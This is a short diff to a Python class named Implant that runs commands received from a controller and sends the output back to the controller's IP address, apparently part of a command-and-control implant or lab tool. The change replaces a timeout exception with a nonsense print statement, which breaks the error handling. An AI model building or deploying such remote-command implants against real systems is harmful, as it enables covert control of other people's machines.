@@ -37,7 +37,7 @@ class Implant(Host):
             #cmd = cmd.split(" ")
             output = self.run(cmd, 3)
             if output is None:
-                raise TimeoutExpired
+                print("doodoofard")
             self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
